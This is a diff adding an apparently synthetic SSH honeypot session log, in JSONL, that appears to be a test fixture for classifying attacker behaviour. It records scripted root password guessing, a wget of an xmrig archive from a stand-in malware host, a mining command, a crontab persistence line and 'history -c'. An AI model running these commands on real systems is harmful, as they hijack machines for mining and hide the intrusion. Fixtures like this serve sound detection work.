@@ -1,0 +1,12 @@
+{"session_id": "sess-class5", "timestamp": "2025-01-10T10:00:00Z", "kind": "session_start", "payload": {"src_ip": "192.0.2.99", "src_port": 40003, "client_version": "SSH-2.0-Go"}, "generated_by": "scripted"}
+{"session_id": "sess-class5", "timestamp": "2025-01-10T10:00:01Z", "kind": "login_attempt", "payload": {"src_ip": "192.0.2.99", "src_port": 40003, "username": "root", "password": "root", "client_version": "SSH-2.0-Go", "success": false}, "generated_by": "scripted"}
+{"session_id": "sess-class5", "timestamp": "2025-01-10T10:00:02Z", "kind": "login_attempt", "payload": {"src_ip": "192.0.2.99", "src_port": 40003, "username": "root", "password": "toor", "client_version": "SSH-2.0-Go", "success": false}, "generated_by": "scripted"}
+{"session_id": "sess-class5", "timestamp": "2025-01-10T10:00:03Z", "kind": "login_attempt", "payload": {"src_ip": "192.0.2.99", "src_port": 40003, "username": "root", "password": "password", "client_version": "SSH-2.0-Go", "success": true}, "generated_by": "scripted"}
+{"session_id": "sess-class5", "timestamp": "2025-01-10T10:00:06Z", "kind": "command", "payload": {"command": "uname -a"}, "generated_by": "scripted"}
+{"session_id": "sess-class5", "timestamp": "2025-01-10T10:00:06Z", "kind": "response", "payload": {"output": "Linux ghost 5.15.0-91-generic x86_64 GNU/Linux\n"}, "generated_by": "scripted"}
+{"session_id": "sess-class5", "timestamp": "2025-01-10T10:00:10Z", "kind": "command", "payload": {"command": "wget http://malware.example.com/xmrig.tar.gz"}, "generated_by": "scripted"}
+{"session_id": "sess-class5", "timestamp": "2025-01-10T10:00:10Z", "kind": "download_attempt", "payload": {"command": "wget http://malware.example.com/xmrig.tar.gz", "url": "http://malware.example.com/xmrig.tar.gz"}, "generated_by": "scripted"}
+{"session_id": "sess-class5", "timestamp": "2025-01-10T10:00:15Z", "kind": "command", "payload": {"command": "./xmrig -o stratum+tcp://pool.example.net:3333 -u wallet"}, "generated_by": "scripted"}
+{"session_id": "sess-class5", "timestamp": "2025-01-10T10:00:20Z", "kind": "command", "payload": {"command": "echo '* * * * * /tmp/xmrig' | crontab -"}, "generated_by": "scripted"}
+{"session_id": "sess-class5", "timestamp": "2025-01-10T10:00:25Z", "kind": "command", "payload": {"command": "history -c"}, "generated_by": "scripted"}
+{"session_id": "sess-class5", "timestamp": "2025-01-10T10:00:30Z", "kind": "session_end", "payload": {"reason": "client_disconnect"}, "generated_by": "scripted"}
